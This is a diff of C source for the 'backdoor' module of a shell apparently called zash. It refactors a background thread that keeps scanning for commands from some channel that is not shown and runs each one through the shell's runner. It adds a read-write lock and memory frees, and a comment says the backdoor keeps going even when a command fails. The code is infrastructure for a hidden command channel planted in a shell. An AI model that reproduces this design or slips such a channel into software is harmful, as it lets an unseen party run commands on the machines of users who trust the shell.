@@ -17,31 +17,35 @@
 
 
 /** Functions ************************************************/
-enum zash_status
-backdoor_run_commands(const struct SCANNER_data *const commands[], size_t commands_amount)
+enum zash_status backdoor_run_commands(struct SCANNER_data **commands,
+                                       size_t commands_amount,
+                                       pthread_rwlock_t *lock)
 {
     enum zash_status status = ZASH_STATUS_UNINITIALIZED;
 
     size_t i = 0;
-    char const *const *argv = NULL;
+    const char **argv = NULL;
     size_t argc = 0;
 
     /* Run all of the commands. */
     for (i = 0; i < commands_amount; ++i) {
-//TODO: docu
-        status = VECTOR_as_array(commands[i]->argv, (void const *const **) &argv, &argc);
+
+        /* Get the arguments as an array */
+        status = VECTOR_as_array(commands[i]->argv, (void ***)&argv, &argc);
         if (ZASH_STATUS_SUCCESS != status) {
             DEBUG_PRINT("status: %d", status);
             goto lbl_cleanup;
         }
 
         /* Run the current command. */
-        status = RUNNER_run(commands[i]->id, argc, argv);
+        status = RUNNER_run(commands[i]->id, argc, argv, lock);
         if (ZASH_STATUS_SUCCESS != status) {
             DEBUG_PRINT("status: %d", status);
             /* dont pass the error value - the backdoor
              * should continue even if a command has failed. */
         }
+
+        HEAPFREE(argv);
     }
 
     /* Indicate Success */
@@ -53,19 +57,19 @@ lbl_cleanup:
 }
 
 
-enum zash_status backdoor_main_loop(const bool *should_stop)
+enum zash_status backdoor_main_loop(struct BACKDOOR_context *context)
 {
     enum zash_status status = ZASH_STATUS_UNINITIALIZED;
     enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;
 
     struct SCANNER_context *scanner = NULL;
     struct VECTOR_context *commands = NULL;
-    const struct SCANNER_data *const *commands_array = NULL;
+    struct SCANNER_data **commands_array = NULL;
     size_t commands_size = 0;
 
 
     /* Check for valid parameters */
-    if (NULL == should_stop) {
+    if (NULL == context) {
         status = ZASH_STATUS_BACKDOOR_MAIN_LOOP_NULL_POINTER;
         DEBUG_PRINT("status: %d", status);
         goto lbl_cleanup;
@@ -79,7 +83,7 @@ enum zash_status backdoor_main_loop(const bool *should_stop)
     }
 
     /* Until we should stop, scan for commands and run them. */
-    while (false == *should_stop) {
+    while (false == context->should_stop) {
 
         /* Scan for new commands to run */
         status = SCANNER_scan(scanner, &commands);
@@ -87,19 +91,22 @@ enum zash_status backdoor_main_loop(const bool *should_stop)
             DEBUG_PRINT("status: %d", status);
             goto lbl_cleanup;
         }
-//TODO: docu
-        status = VECTOR_as_array(commands, (const void *const **) &commands_array, &commands_size);
+
+        /* Get the commands as an array */
+        status = VECTOR_as_array(commands, (void ***)&commands_array, &commands_size);
         if (ZASH_STATUS_SUCCESS != status) {
             DEBUG_PRINT("status: %d", status);
             goto lbl_cleanup;
         }
 
         /* Run all commands found */
-        status = backdoor_run_commands(commands_array, commands_size);
+        status = backdoor_run_commands(commands_array, commands_size, context->lock);
         if (ZASH_STATUS_SUCCESS != status) {
             DEBUG_PRINT("status: %d", status);
             goto lbl_cleanup;
         }
+
+        HEAPFREE(commands_array);
 
         /* Free the commands vector */
         status = VECTOR_destroy(commands, (VECTOR_free_func_t) SCANNER_free_data);
@@ -115,6 +122,8 @@ enum zash_status backdoor_main_loop(const bool *should_stop)
     status = ZASH_STATUS_SUCCESS;
 
 lbl_cleanup:
+
+    HEAPFREE(commands_array);
 
     /* Destroy the scanner created */
     if (NULL != scanner) {
@@ -133,7 +142,7 @@ lbl_cleanup:
 }
 
 
-enum zash_status BACKDOOR_create(struct BACKDOOR_context **context)
+enum zash_status BACKDOOR_create(pthread_rwlock_t *lock, struct BACKDOOR_context **context)
 {
 
     enum zash_status status = ZASH_STATUS_UNINITIALIZED;
@@ -141,7 +150,7 @@ enum zash_status BACKDOOR_create(struct BACKDOOR_context **context)
     struct BACKDOOR_context *temp_context = NULL;
 
     /* Check for valid parameters */
-    if (NULL == context) {
+    if ((NULL == context) || (NULL == lock)) {
         status = ZASH_STATUS_BACKDOOR_CREATE_NULL_POINTER;
         DEBUG_PRINT("status: %d", status);
         goto lbl_cleanup;
@@ -156,6 +165,7 @@ enum zash_status BACKDOOR_create(struct BACKDOOR_context **context)
     }
 
     /* Initialize fields */
+    temp_context->lock = lock;
     temp_context->should_stop = false;
     temp_context->is_thread_running = false;
 
@@ -192,7 +202,7 @@ enum zash_status BACKDOOR_run(struct BACKDOOR_context *context)
     ptrhead_return_value = pthread_create(&context->thread_id,
                                           NULL,
                                           (backdoor_pthread_func_t) backdoor_main_loop,
-                                          &context->should_stop);
+                                          context);
     if (C_STANDARD_FAILURE_VALUE == ptrhead_return_value) {
         status = ZASH_STATUS_BACKDOOR_RUN_PTHREAD_CREATE_FAILED;
         DEBUG_PRINT("status: %d", status);
